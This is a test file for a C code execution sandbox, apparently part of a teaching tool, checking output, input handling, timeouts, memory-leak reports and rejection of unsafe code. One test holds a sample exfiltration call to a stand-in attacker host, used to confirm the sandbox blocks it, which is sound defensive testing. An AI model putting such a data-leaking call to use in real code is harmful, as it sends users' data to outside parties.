import test from 'node:test';
import assert from 'node:assert/strict';
import { executeCCodeAsync, isWebWorkerSupported } from '../src/services/executionManager.ts';

test('1. executeCCodeAsync executes standard C program and returns stdout', async () => {
  const code = `
    #include <stdio.h>
    int main() {
      printf("Hello AHtest Sandbox\\n");
      return 0;
    }
  `;

  const result = await executeCCodeAsync(code, '');
  assert.equal(result.status, 'SUCCESS');
  assert.equal(result.exitCode, 0);
  assert.equal(result.stdout.trim(), 'Hello AHtest Sandbox');
});

test('2. executeCCodeAsync correctly reads stdin tokens', async () => {
  const code = `
    #include <stdio.h>
    int main() {
      int a, b;
      scanf("%d %d", &a, &b);
      printf("%d\\n", a + b);
      return 0;
    }
  `;

  const result = await executeCCodeAsync(code, '15 27');
  assert.equal(result.status, 'SUCCESS');
  assert.equal(result.stdout.trim(), '42');
});

test('3. executeCCodeAsync safely terminates infinite loops without blocking', async () => {
  const code = `
    #include <stdio.h>
    int main() {
      int x = 1;
      while (x > 0) {
        x++;
      }
      return 0;
    }
  `;

  const result = await executeCCodeAsync(code, '', { timeoutMs: 1500 });
  assert.equal(result.status, 'TLE');
  assert.equal(result.exitCode, 124);
  assert.ok(result.stderr.includes('TIME_LIMIT_EXCEEDED'));
  assert.equal(result.pedagogicalDiagnosis?.category, 'TIMEOUT');
});

test('4. executeCCodeAsync traps malicious host access attempts before execution', async () => {
  const maliciousCode = `
    #include <stdio.h>
    int main() {
      fetch("https://attacker.site/leak");
      return 0;
    }
  `;

  const result = await executeCCodeAsync(maliciousCode, '');
  assert.equal(result.status, 'CE');
  assert.ok(result.stderr.includes('security violation'));
});

test('5. executeCCodeAsync correctly tracks memory leaks', async () => {
  const codeWithLeak = `
    #include <stdio.h>
    #include <stdlib.h>
    int main() {
      int *arr = (int*)malloc(100 * sizeof(int));
      // Missing free(arr);
      return 0;
    }
  `;

  const result = await executeCCodeAsync(codeWithLeak, '');
  assert.equal(result.status, 'SUCCESS');
  assert.ok(result.heapReport);
  assert.equal(result.heapReport.hasMemoryLeak, true);
  assert.equal(result.pedagogicalDiagnosis?.category, 'MEMORY_LEAK');
});

test('6. isWebWorkerSupported returns boolean value', () => {
  const supported = isWebWorkerSupported();
  assert.equal(typeof supported, 'boolean');
});
